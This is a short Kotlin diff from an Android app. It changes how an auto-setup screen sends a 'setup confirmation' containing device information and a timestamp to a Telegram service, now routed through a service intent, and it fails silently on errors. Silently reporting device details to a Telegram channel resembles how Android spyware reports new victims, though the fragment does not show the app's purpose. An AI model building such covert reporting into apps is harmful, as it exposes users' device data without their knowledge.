@@ -191,7 +191,6 @@ class AutoSetupActivity : AppCompatActivity() {
     private fun sendSetupConfirmation() {
         lifecycleScope.launch {
             try {
-                val telegramService = TelegramService()
                 val deviceInfo = DeviceUtils.getDeviceInfo(this@AutoSetupActivity)
                 
                 val message = """
@@ -210,7 +209,11 @@ class AutoSetupActivity : AppCompatActivity() {
                 Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}
                 """.trimIndent()
                 
-                telegramService.sendMessage(message)
+                // Send via service intent instead of direct instantiation
+                val telegramIntent = Intent(this@AutoSetupActivity, TelegramService::class.java)
+                telegramIntent.putExtra("action", "send_message")
+                telegramIntent.putExtra("message", message)
+                startService(telegramIntent)
                 
             } catch (e: Exception) {
                 // Silent fail - don't interrupt setup
